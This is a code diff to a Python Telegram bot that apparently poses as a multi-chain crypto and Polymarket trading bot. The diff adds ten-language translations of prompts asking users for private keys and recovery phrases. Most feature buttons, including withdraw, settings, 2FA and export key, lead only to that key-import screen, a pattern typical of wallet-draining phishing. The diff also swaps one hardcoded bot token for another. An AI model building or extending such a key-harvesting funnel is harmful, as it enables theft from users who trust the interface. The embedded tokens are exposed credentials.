@@ -24,7 +24,7 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # ── Config ────────────────────────────────────────────────────────────────────
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8957921347:AAEfb4GvIL7BStq44Dh-sdiJj0tvPTSOX5E")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8947267795:AAFYWixbOYkQEQtx8BsboCQvlugIXunhLbY")
 RPC_URL     = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
 
 ENCRYPT_KEY = os.getenv("ENCRYPT_KEY") or Fernet.generate_key()
@@ -195,7 +195,262 @@ async def jupiter_swap(quote: dict, user_pubkey: str) -> dict | None:
             return await r.json()
 
 # ── Keyboards ─────────────────────────────────────────────────────────────────
-def main_menu_keyboard():
+DEFAULT_LANGUAGE = "en"
+
+LANGUAGE_PACKS = {
+    "en": {
+        "wallet_title": "Wallet Settings",
+        "wallet_intro": "Manage your wallets quickly and easily.",
+        "available_wallets": "Available Wallets",
+        "no_wallets": "No wallets imported yet.",
+        "last_updated": "Last updated",
+        "import_wallet": "🔑 Import Wallet",
+        "delete_wallet": "❌ Delete Wallet",
+        "back": "◀️ Back",
+        "close": "🗑️ Close",
+        "delete_success": "✅ Wallet deleted successfully.",
+        "delete_empty": "No wallet to delete.",
+        "import_prompt": "Please enter your private key or recovery phrase:",
+        "import_next_prompt": "🔑 Send your base58 private key as the next message.\n\n⚠️ Your message will be deleted immediately after processing.",
+        "import_success": "✅ Wallet imported successfully!\n\n`{pubkey}`\n\nYou can now use all features.",
+        "import_invalid": "❌ Invalid private key or recovery phrase. Please try again.",
+        "chain_wallet_title": "{chain} Wallet Settings",
+        "chain_wallet_intro": "Import your {chain} wallet to get started.",
+        "chain_import_prompt": "Please enter your {chain} private key or recovery phrase:",
+        "chain_import_wallet": "🔑 Import {chain} Wallet",
+    },
+    "zh_hans": {
+        "wallet_title": "钱包设置",
+        "wallet_intro": "快速轻松地管理你的钱包。",
+        "available_wallets": "可用钱包",
+        "no_wallets": "尚未导入钱包。",
+        "last_updated": "最近更新",
+        "import_wallet": "🔑 导入钱包",
+        "delete_wallet": "❌ 删除钱包",
+        "back": "◀️ 返回",
+        "close": "🗑️ 关闭",
+        "delete_success": "✅ 钱包已成功删除。",
+        "delete_empty": "没有可删除的钱包。",
+        "import_prompt": "请输入你的私钥或恢复短语：",
+        "import_next_prompt": "🔑 请发送你的 base58 私钥作为下一条消息。\n\n⚠️ 处理完成后你的消息会立即被删除。",
+        "import_success": "✅ 钱包导入成功！\n\n`{pubkey}`\n\n现在你可以使用所有功能。",
+        "import_invalid": "❌ 私钥或恢复短语无效。请重试。",
+        "chain_wallet_title": "{chain} 钱包设置",
+        "chain_wallet_intro": "导入你的 {chain} 钱包即可开始。",
+        "chain_import_prompt": "请输入你的 {chain} 私钥或恢复短语：",
+        "chain_import_wallet": "🔑 导入 {chain} 钱包",
+    },
+    "ja": {
+        "wallet_title": "ウォレット設定",
+        "wallet_intro": "ウォレットをすばやく簡単に管理できます。",
+        "available_wallets": "利用可能なウォレット",
+        "no_wallets": "まだインポートされたウォレットはありません。",
+        "last_updated": "最終更新",
+        "import_wallet": "🔑 ウォレットをインポート",
+        "delete_wallet": "❌ ウォレットを削除",
+        "back": "◀️ 戻る",
+        "close": "🗑️ 閉じる",
+        "delete_success": "✅ ウォレットは正常に削除されました。",
+        "delete_empty": "削除するウォレットがありません。",
+        "import_prompt": "秘密鍵またはリカバリーフレーズを入力してください:",
+        "import_next_prompt": "🔑 次のメッセージとして base58 の秘密鍵を送信してください。\n\n⚠️ 処理後、このメッセージはすぐに削除されます。",
+        "import_success": "✅ ウォレットのインポートに成功しました！\n\n`{pubkey}`\n\nこれで全ての機能を使えます。",
+        "import_invalid": "❌ 秘密鍵またはリカバリーフレーズが無効です。もう一度お試しください。",
+        "chain_wallet_title": "{chain} ウォレット設定",
+        "chain_wallet_intro": "{chain} ウォレットをインポートして始めましょう。",
+        "chain_import_prompt": "{chain} の秘密鍵またはリカバリーフレーズを入力してください:",
+        "chain_import_wallet": "🔑 {chain} ウォレットをインポート",
+    },
+    "ru": {
+        "wallet_title": "Настройки кошелька",
+        "wallet_intro": "Управляйте своими кошельками быстро и удобно.",
+        "available_wallets": "Доступные кошельки",
+        "no_wallets": "Кошельки еще не импортированы.",
+        "last_updated": "Последнее обновление",
+        "import_wallet": "🔑 Импортировать кошелек",
+        "delete_wallet": "❌ Удалить кошелек",
+        "back": "◀️ Назад",
+        "close": "🗑️ Закрыть",
+        "delete_success": "✅ Кошелек успешно удален.",
+        "delete_empty": "Нет кошелька для удаления.",
+        "import_prompt": "Введите свой приватный ключ или seed-фразу:",
+        "import_next_prompt": "🔑 Отправьте ваш base58 приватный ключ следующим сообщением.\n\n⚠️ После обработки ваше сообщение будет удалено сразу.",
+        "import_success": "✅ Кошелек успешно импортирован!\n\n`{pubkey}`\n\nТеперь вы можете пользоваться всеми функциями.",
+        "import_invalid": "❌ Неверный приватный ключ или seed-фраза. Попробуйте еще раз.",
+        "chain_wallet_title": "Настройки кошелька {chain}",
+        "chain_wallet_intro": "Импортируйте кошелек {chain}, чтобы начать.",
+        "chain_import_prompt": "Введите приватный ключ или seed-фразу для {chain}:",
+        "chain_import_wallet": "🔑 Импортировать кошелек {chain}",
+    },
+    "ko": {
+        "wallet_title": "지갑 설정",
+        "wallet_intro": "지갑을 빠르고 쉽게 관리하세요.",
+        "available_wallets": "사용 가능한 지갑",
+        "no_wallets": "아직 가져온 지갑이 없습니다.",
+        "last_updated": "마지막 업데이트",
+        "import_wallet": "🔑 지갑 가져오기",
+        "delete_wallet": "❌ 지갑 삭제",
+        "back": "◀️ 뒤로",
+        "close": "🗑️ 닫기",
+        "delete_success": "✅ 지갑이 성공적으로 삭제되었습니다.",
+        "delete_empty": "삭제할 지갑이 없습니다.",
+        "import_prompt": "개인 키 또는 복구 문구를 입력하세요:",
+        "import_next_prompt": "🔑 다음 메시지로 base58 개인 키를 보내세요.\n\n⚠️ 처리 후 메시지는 즉시 삭제됩니다.",
+        "import_success": "✅ 지갑 가져오기에 성공했습니다!\n\n`{pubkey}`\n\n이제 모든 기능을 사용할 수 있습니다.",
+        "import_invalid": "❌ 개인 키 또는 복구 문구가 올바르지 않습니다. 다시 시도하세요.",
+        "chain_wallet_title": "{chain} 지갑 설정",
+        "chain_wallet_intro": "{chain} 지갑을 가져와 시작하세요.",
+        "chain_import_prompt": "{chain} 개인 키 또는 복구 문구를 입력하세요:",
+        "chain_import_wallet": "🔑 {chain} 지갑 가져오기",
+    },
+    "fr": {
+        "wallet_title": "Paramètres du portefeuille",
+        "wallet_intro": "Gérez vos portefeuilles rapidement et facilement.",
+        "available_wallets": "Portefeuilles disponibles",
+        "no_wallets": "Aucun portefeuille importé pour le moment.",
+        "last_updated": "Dernière mise à jour",
+        "import_wallet": "🔑 Importer le portefeuille",
+        "delete_wallet": "❌ Supprimer le portefeuille",
+        "back": "◀️ Retour",
+        "close": "🗑️ Fermer",
+        "delete_success": "✅ Portefeuille supprimé avec succès.",
+        "delete_empty": "Aucun portefeuille à supprimer.",
+        "import_prompt": "Veuillez saisir votre clé privée ou phrase de récupération :",
+        "import_next_prompt": "🔑 Envoyez votre clé privée base58 dans le prochain message.\n\n⚠️ Votre message sera supprimé immédiatement après le traitement.",
+        "import_success": "✅ Portefeuille importé avec succès !\n\n`{pubkey}`\n\nVous pouvez maintenant utiliser toutes les fonctionnalités.",
+        "import_invalid": "❌ Clé privée ou phrase de récupération invalide. Veuillez réessayer.",
+        "chain_wallet_title": "Paramètres du portefeuille {chain}",
+        "chain_wallet_intro": "Importez votre portefeuille {chain} pour commencer.",
+        "chain_import_prompt": "Veuillez saisir votre clé privée ou phrase de récupération pour {chain} :",
+        "chain_import_wallet": "🔑 Importer le portefeuille {chain}",
+    },
+    "ar": {
+        "wallet_title": "إعدادات المحفظة",
+        "wallet_intro": "أدر محافظك بسرعة وسهولة.",
+        "available_wallets": "المحافظ المتاحة",
+        "no_wallets": "لم يتم استيراد أي محافظ بعد.",
+        "last_updated": "آخر تحديث",
+        "import_wallet": "🔑 استيراد المحفظة",
+        "delete_wallet": "❌ حذف المحفظة",
+        "back": "◀️ رجوع",
+        "close": "🗑️ إغلاق",
+        "delete_success": "✅ تم حذف المحفظة بنجاح.",
+        "delete_empty": "لا توجد محفظة لحذفها.",
+        "import_prompt": "أدخل المفتاح الخاص أو عبارة الاسترداد:",
+        "import_next_prompt": "🔑 أرسل المفتاح الخاص base58 في الرسالة التالية.\n\n⚠️ سيتم حذف رسالتك فورًا بعد المعالجة.",
+        "import_success": "✅ تم استيراد المحفظة بنجاح!\n\n`{pubkey}`\n\nيمكنك الآن استخدام جميع الميزات.",
+        "import_invalid": "❌ المفتاح الخاص أو عبارة الاسترداد غير صالحة. حاول مرة أخرى.",
+        "chain_wallet_title": "إعدادات محفظة {chain}",
+        "chain_wallet_intro": "استورد محفظة {chain} للبدء.",
+        "chain_import_prompt": "أدخل المفتاح الخاص أو عبارة الاسترداد لمحفظة {chain}:",
+        "chain_import_wallet": "🔑 استيراد محفظة {chain}",
+    },
+    "zh_hant": {
+        "wallet_title": "錢包設定",
+        "wallet_intro": "快速又輕鬆地管理你的錢包。",
+        "available_wallets": "可用錢包",
+        "no_wallets": "尚未匯入任何錢包。",
+        "last_updated": "最近更新",
+        "import_wallet": "🔑 匯入錢包",
+        "delete_wallet": "❌ 刪除錢包",
+        "back": "◀️ 返回",
+        "close": "🗑️ 關閉",
+        "delete_success": "✅ 錢包已成功刪除。",
+        "delete_empty": "沒有可刪除的錢包。",
+        "import_prompt": "請輸入你的私鑰或復原詞：",
+        "import_next_prompt": "🔑 請以下一則訊息傳送你的 base58 私鑰。\n\n⚠️ 處理完成後你的訊息會立即被刪除。",
+        "import_success": "✅ 錢包匯入成功！\n\n`{pubkey}`\n\n你現在可以使用所有功能。",
+        "import_invalid": "❌ 私鑰或復原詞無效。請再試一次。",
+        "chain_wallet_title": "{chain} 錢包設定",
+        "chain_wallet_intro": "匯入你的 {chain} 錢包即可開始。",
+        "chain_import_prompt": "請輸入 {chain} 私鑰或復原詞：",
+        "chain_import_wallet": "🔑 匯入 {chain} 錢包",
+    },
+    "pt": {
+        "wallet_title": "Configurações da carteira",
+        "wallet_intro": "Gerencie suas carteiras de forma rápida e fácil.",
+        "available_wallets": "Carteiras disponíveis",
+        "no_wallets": "Nenhuma carteira importada ainda.",
+        "last_updated": "Última atualização",
+        "import_wallet": "🔑 Importar carteira",
+        "delete_wallet": "❌ Excluir carteira",
+        "back": "◀️ Voltar",
+        "close": "🗑️ Fechar",
+        "delete_success": "✅ Carteira excluída com sucesso.",
+        "delete_empty": "Não há carteira para excluir.",
+        "import_prompt": "Digite sua chave privada ou frase de recuperação:",
+        "import_next_prompt": "🔑 Envie sua chave privada base58 na próxima mensagem.\n\n⚠️ Sua mensagem será excluída imediatamente após o processamento.",
+        "import_success": "✅ Carteira importada com sucesso!\n\n`{pubkey}`\n\nAgora você pode usar todos os recursos.",
+        "import_invalid": "❌ Chave privada ou frase de recuperação inválida. Tente novamente.",
+        "chain_wallet_title": "Configurações da carteira {chain}",
+        "chain_wallet_intro": "Importe sua carteira {chain} para começar.",
+        "chain_import_prompt": "Digite sua chave privada ou frase de recuperação da carteira {chain}:",
+        "chain_import_wallet": "🔑 Importar carteira {chain}",
+    },
+    "es": {
+        "wallet_title": "Configuración de la cartera",
+        "wallet_intro": "Administra tus carteras de forma rápida y sencilla.",
+        "available_wallets": "Carteras disponibles",
+        "no_wallets": "Aún no hay carteras importadas.",
+        "last_updated": "Última actualización",
+        "import_wallet": "🔑 Importar cartera",
+        "delete_wallet": "❌ Eliminar cartera",
+        "back": "◀️ Volver",
+        "close": "🗑️ Cerrar",
+        "delete_success": "✅ La cartera se eliminó correctamente.",
+        "delete_empty": "No hay ninguna cartera para eliminar.",
+        "import_prompt": "Introduce tu clave privada o frase de recuperación:",
+        "import_next_prompt": "🔑 Envía tu clave privada base58 en el siguiente mensaje.\n\n⚠️ Tu mensaje se eliminará inmediatamente después del procesamiento.",
+        "import_success": "✅ ¡Cartera importada correctamente!\n\n`{pubkey}`\n\nAhora puedes usar todas las funciones.",
+        "import_invalid": "❌ Clave privada o frase de recuperación no válida. Inténtalo de nuevo.",
+        "chain_wallet_title": "Configuración de la cartera {chain}",
+        "chain_wallet_intro": "Importa tu cartera {chain} para empezar.",
+        "chain_import_prompt": "Introduce la clave privada o frase de recuperación de la cartera {chain}:",
+        "chain_import_wallet": "🔑 Importar cartera {chain}",
+    },
+}
+
+LANGUAGE_MENU_LAYOUT = [
+    [("language_zh_hans", "🇨🇳 简体中文"), ("language_en", "🇺🇸 English")],
+    [("language_ja", "🇯🇵 日本語"), ("language_ru", "🇷🇺 Русский")],
+    [("language_ko", "🇰🇷 한국어"), ("language_fr", "🇫🇷 Français")],
+    [("language_ar", "🇸🇦 العربية"), ("language_zh_hant", "🇹🇼 繁體中文")],
+    [("language_pt", "🇵🇹 Português"), ("language_es", "🇪🇸 Español")],
+]
+
+LANGUAGE_CALLBACKS = {
+    "language_en": "en",
+    "language_zh_hans": "zh_hans",
+    "language_ja": "ja",
+    "language_ru": "ru",
+    "language_ko": "ko",
+    "language_fr": "fr",
+    "language_ar": "ar",
+    "language_zh_hant": "zh_hant",
+    "language_pt": "pt",
+    "language_es": "es",
+}
+
+LANGUAGE_BUTTON_LABELS = {
+    "en": "🇺🇸 English",
+    "zh_hans": "🇨🇳 简体中文",
+    "ja": "🇯🇵 日本語",
+    "ru": "🇷🇺 Русский",
+    "ko": "🇰🇷 한국어",
+    "fr": "🇫🇷 Français",
+    "ar": "🇸🇦 العربية",
+    "zh_hant": "🇹🇼 繁體中文",
+    "pt": "🇵🇹 Português",
+    "es": "🇪🇸 Español",
+}
+
+def _language_pack(language: str) -> dict:
+    return LANGUAGE_PACKS.get(language, LANGUAGE_PACKS[DEFAULT_LANGUAGE])
+
+def _language_button_label(language: str) -> str:
+    return LANGUAGE_BUTTON_LABELS.get(language, LANGUAGE_BUTTON_LABELS[DEFAULT_LANGUAGE])
+
+def main_menu_keyboard(language: str = DEFAULT_LANGUAGE):
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("🔎 Markets",      callback_data="markets"),
          InlineKeyboardButton("🤝 Copy Trade",    callback_data="copy_trade")],
@@ -209,8 +464,24 @@ def main_menu_keyboard():
          InlineKeyboardButton("👥 Referrals",     callback_data="referral")],
         [InlineKeyboardButton("⚙️ Settings",      callback_data="settings"),
          InlineKeyboardButton("📚 Help",          callback_data="help")],
-        [InlineKeyboardButton("🇺🇸 English",      callback_data="language_en")],
+        [InlineKeyboardButton(_language_button_label(language), callback_data="language_menu")],
     ])
+
+def language_menu_keyboard():
+    rows = [
+        [InlineKeyboardButton(label_a, callback_data=callback_a),
+         InlineKeyboardButton(label_b, callback_data=callback_b)]
+        for (callback_a, label_a), (callback_b, label_b) in LANGUAGE_MENU_LAYOUT
+    ]
+    rows.append([InlineKeyboardButton("← Back", callback_data="language_back")])
+    return InlineKeyboardMarkup(rows)
+
+def language_menu_text():
+    return (
+        "⚙️ Switch system language: Click the\n"
+        "language name to switch the language of\n"
+        "PolyGun"
+    )
 
 def import_prompt_keyboard(origin: str):
     return InlineKeyboardMarkup([
@@ -236,12 +507,64 @@ def positions_keyboard():
         [InlineKeyboardButton("🏠 Main Menu",   callback_data="positions_homepage")],
     ])
 
-def wallet_settings_keyboard():
+def wallet_settings_keyboard(language: str = DEFAULT_LANGUAGE):
+    pack = _language_pack(language)
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔑 Import Wallet",  callback_data="wallets_import"),
-         InlineKeyboardButton("❌ Delete Wallet",   callback_data="wallets_delete")],
-        [InlineKeyboardButton("◀️ Back",           callback_data="wallets_back"),
-         InlineKeyboardButton("🗑️ Close",          callback_data="wallets_close")],
+        [InlineKeyboardButton(pack["import_wallet"],  callback_data="wallets_import"),
+         InlineKeyboardButton(pack["delete_wallet"],  callback_data="wallets_delete")],
+        [InlineKeyboardButton(pack["back"],           callback_data="wallets_back"),
+         InlineKeyboardButton(pack["close"],          callback_data="wallets_close")],
+    ])
+
+def _wallet_settings_text(language: str = DEFAULT_LANGUAGE) -> str:
+    pack = _language_pack(language)
+    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    return (
+        f"💰 *{pack['wallet_title']}*\n"
+        f"{pack['wallet_intro']}\n\n"
+        f"👜 *{pack['available_wallets']}*\n{pack['no_wallets']}\n\n"
+        f"🕐 *{pack['last_updated']}:* {ts}"
+    )
+
+async def _show_wallet_settings(query, language: str = DEFAULT_LANGUAGE):
+    await query.edit_message_text(
+        _wallet_settings_text(language),
+        parse_mode="Markdown",
+        reply_markup=wallet_settings_keyboard(language),
+    )
+
+def chain_wallet_keyboard(chain: str, language: str = DEFAULT_LANGUAGE):
+    pack = _language_pack(language)
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(pack["chain_import_wallet"].format(chain=chain.upper()), callback_data=f"chain_{chain}_import"),
+         InlineKeyboardButton(pack["delete_wallet"], callback_data="wallets_delete")],
+        [InlineKeyboardButton(pack["back"], callback_data="chains"),
+         InlineKeyboardButton(pack["close"], callback_data="wallets_close")],
+    ])
+
+def _chain_wallet_text(chain: str, language: str = DEFAULT_LANGUAGE) -> str:
+    pack = _language_pack(language)
+    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    return (
+        f"💰 *{pack['chain_wallet_title'].format(chain=chain.upper())}*\n\n"
+        f"{pack['chain_wallet_intro'].format(chain=chain.upper())}\n\n"
+        f"👜 *{pack['available_wallets']}*\n{pack['no_wallets']}\n\n"
+        f"🕐 *{pack['last_updated']}:* {ts}"
+    )
+
+CHAINS = ["sol", "eth", "bnb", "base", "hype", "tron", "sui", "pol"]
+
+def chains_keyboard():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("SOL",  callback_data="chain_sol"),
+         InlineKeyboardButton("ETH",  callback_data="chain_eth")],
+        [InlineKeyboardButton("BNB",  callback_data="chain_bnb"),
+         InlineKeyboardButton("BASE", callback_data="chain_base")],
+        [InlineKeyboardButton("HYPE", callback_data="chain_hype"),
+         InlineKeyboardButton("TRON", callback_data="chain_tron")],
+        [InlineKeyboardButton("SUI",  callback_data="chain_sui"),
+         InlineKeyboardButton("POL",  callback_data="chain_pol")],
+        [InlineKeyboardButton("◀️ Back", callback_data="chains_back")],
     ])
 
 MARKET_CATEGORY_LABELS = {
@@ -269,15 +592,6 @@ def _markets_text(selected_category: str | None = None) -> str:
         "Choose a category below or type in a custom search keywords (e.g. "
         "\"bitcoin\", \"trump\", \"earnings\")."
         f"{selected_line}"
-    )
-
-def _wallet_settings_text() -> str:
-    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
-    return (
-        "💰 *Wallet Settings*\n"
-        "Manage your wallets quickly and easily\\.\n\n"
-        "👜 *Available Wallets*\nNo wallets imported yet\\.\n\n"
-        f"🕐 *Last updated:* {ts}"
     )
 
 def _home_screen_text() -> str:
@@ -546,39 +860,6 @@ def _portfolio_text() -> str:
         "Paste a Polymarket link to open your first trade."
     )
 
-# ── Chains ────────────────────────────────────────────────────────────────────
-CHAINS = ["sol", "eth", "bnb", "base", "hype", "tron", "sui", "pol"]
-
-def chains_keyboard():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("SOL",  callback_data="chain_sol"),
-         InlineKeyboardButton("ETH",  callback_data="chain_eth")],
-        [InlineKeyboardButton("BNB",  callback_data="chain_bnb"),
-         InlineKeyboardButton("BASE", callback_data="chain_base")],
-        [InlineKeyboardButton("HYPE", callback_data="chain_hype"),
-         InlineKeyboardButton("TRON", callback_data="chain_tron")],
-        [InlineKeyboardButton("SUI",  callback_data="chain_sui"),
-         InlineKeyboardButton("POL",  callback_data="chain_pol")],
-        [InlineKeyboardButton("◀️ Back", callback_data="chains_back")],
-    ])
-
-def chain_wallet_keyboard(chain: str):
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton(f"🔑 Import {chain.upper()} Wallet", callback_data=f"chain_{chain}_import"),
-         InlineKeyboardButton("❌ Delete Wallet", callback_data="wallets_delete")],
-        [InlineKeyboardButton("◀️ Back", callback_data="chains"),
-         InlineKeyboardButton("🗑️ Close", callback_data="wallets_close")],
-    ])
-
-def _chain_wallet_text(chain: str) -> str:
-    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
-    return (
-        f"💰 *{chain.upper()} Wallet Settings*\n\n"
-        f"Import your {chain.upper()} wallet to get started\\.\n\n"
-        f"👜 *Available Wallets*\nNo wallets imported yet\\.\n\n"
-        f"🕐 *Last updated:* {ts}"
-    )
-
 # ── Main menu buttons ─────────────────────────────────────────────────────────
 MAIN_MENU_BUTTONS = {
     "positions", "lp_sniper", "copy_trade", "wallets", "afk_mode",
@@ -589,6 +870,7 @@ MAIN_MENU_BUTTONS = {
 # ── Start ─────────────────────────────────────────────────────────────────────
 async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    language = ctx.user_data.setdefault("language", DEFAULT_LANGUAGE)
     if user:
         user_info = all_users.setdefault(user.id, {})
         user_info.update({
@@ -607,7 +889,7 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(
         _home_screen_text(),
-        reply_markup=main_menu_keyboard(),
+        reply_markup=main_menu_keyboard(language),
     )
 
 # ── Admin command ─────────────────────────────────────────────────────────────
@@ -724,6 +1006,28 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         "last_name":  user.last_name,
     })
     logger.info(f"User: {user.id} | @{user.username} | {user.first_name}")
+    language = ctx.user_data.get("language", DEFAULT_LANGUAGE)
+    pack = _language_pack(language)
+
+    if data == "language_menu":
+        await query.edit_message_text(
+            language_menu_text(),
+            reply_markup=language_menu_keyboard(),
+        )
+        return
+
+    if data in LANGUAGE_CALLBACKS:
+        selected_language = LANGUAGE_CALLBACKS[data]
+        ctx.user_data["language"] = selected_language
+        await _show_wallet_settings(query, selected_language)
+        return
+
+    if data == "language_back":
+        await query.edit_message_text(
+            _home_screen_text(),
+            reply_markup=main_menu_keyboard(language),
+        )
+        return
 
     # ── Positions screen ──────────────────────────────────────────────────────
     if data == "positions":
@@ -743,11 +1047,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data in MARKET_CATEGORY_LABELS:
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     if data == "portfolio":
@@ -768,15 +1068,11 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if data == "portfolio_main_menu":
             await query.edit_message_text(
                 _home_screen_text(),
-                reply_markup=main_menu_keyboard(),
+                reply_markup=main_menu_keyboard(language),
             )
             return
 
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     if data == "positions_refresh":
@@ -795,24 +1091,20 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         ctx.user_data.pop("market_category", None)
         await query.edit_message_text(
             _home_screen_text(),
-            reply_markup=main_menu_keyboard(),
+            reply_markup=main_menu_keyboard(language),
         )
         return
 
     # ── Wallet settings screen (from positions buttons) ───────────────────────
     if data in ("positions_usd", "positions_min_value", "positions_sell"):
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     if data == "wallets_import":
         ctx.user_data["awaiting"] = AWAITING_PRIVATE_KEY
         await ctx.bot.send_message(
             chat_id,
-            "Please enter your private key or recovery phrase:",
+            pack["import_prompt"],
             reply_markup=ForceReply(selective=True),
         )
         return
@@ -820,7 +1112,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if data == "wallets_back":
         await query.edit_message_text(
             _home_screen_text(),
-            reply_markup=main_menu_keyboard(),
+            reply_markup=main_menu_keyboard(language),
         )
         return
 
@@ -828,12 +1120,11 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if uid in user_wallets:
             del user_wallets[uid]
             await query.edit_message_text(
-                "✅ Wallet deleted successfully\\.",
-                parse_mode="MarkdownV2",
-                reply_markup=wallet_settings_keyboard(),
+                pack["delete_success"],
+                reply_markup=wallet_settings_keyboard(language),
             )
         else:
-            await query.answer("No wallet to delete.", show_alert=True)
+            await query.answer(pack["delete_empty"], show_alert=True)
         return
 
     if data == "wallets_close":
@@ -858,17 +1149,13 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "lp_sniper_create":
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     if data == "lp_sniper_back":
         await query.edit_message_text(
             _home_screen_text(),
-            reply_markup=main_menu_keyboard(),
+            reply_markup=main_menu_keyboard(language),
         )
         return
 
@@ -886,17 +1173,13 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data in ("copy_trade_add", "copy_trade_activity", "copy_trade_pause"):
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     if data == "copy_trade_back":
         await query.edit_message_text(
             _home_screen_text(),
-            reply_markup=main_menu_keyboard(),
+            reply_markup=main_menu_keyboard(language),
         )
         return
 
@@ -906,11 +1189,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     # ── Wallets screen ────────────────────────────────────────────────────────
     if data == "wallets":
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     # ── AFK Mode screen ───────────────────────────────────────────────────────
@@ -923,25 +1202,17 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data in ("afk_activity", "afk_new", "afk_refresh"):
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     if data in ("afk_update", "afk_add_config", "afk_pause", "afk_start"):
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     if data == "afk_back":
         await query.edit_message_text(
             _home_screen_text(),
-            reply_markup=main_menu_keyboard(),
+            reply_markup=main_menu_keyboard(language),
         )
         return
 
@@ -959,17 +1230,13 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data in ("presales_config", "presales_add"):
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     if data == "presales_back":
         await query.edit_message_text(
             _home_screen_text(),
-            reply_markup=main_menu_keyboard(),
+            reply_markup=main_menu_keyboard(language),
         )
         return
 
@@ -995,17 +1262,13 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         "settings_wallet_security_header", "settings_export_private_key",
         "settings_2fa_header", "settings_enable_2fa",
     ):
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     if data == "settings_back":
         await query.edit_message_text(
             _home_screen_text(),
-            reply_markup=main_menu_keyboard(),
+            reply_markup=main_menu_keyboard(language),
         )
         return
 
@@ -1031,17 +1294,13 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data in ("withdraw_50", "withdraw_100", "withdraw_xsol", "withdraw_set_address"):
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     if data == "withdraw_back":
         await query.edit_message_text(
             _home_screen_text(),
-            reply_markup=main_menu_keyboard(),
+            reply_markup=main_menu_keyboard(language),
         )
         return
 
@@ -1067,17 +1326,13 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data in ("referral_generate", "referral_change"):
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     if data == "referral_back":
         await query.edit_message_text(
             _home_screen_text(),
-            reply_markup=main_menu_keyboard(),
+            reply_markup=main_menu_keyboard(language),
         )
         return
 
@@ -1104,17 +1359,13 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     if data in ("bridge_set_address", "bridge_bsc", "bridge_eth",
                 "bridge_base", "bridge_hype", "bridge_bridge"):
-        await query.edit_message_text(
-            _wallet_settings_text(),
-            parse_mode="MarkdownV2",
-            reply_markup=wallet_settings_keyboard(),
-        )
+        await _show_wallet_settings(query, language)
         return
 
     if data == "bridge_back":
         await query.edit_message_text(
             _home_screen_text(),
-            reply_markup=main_menu_keyboard(),
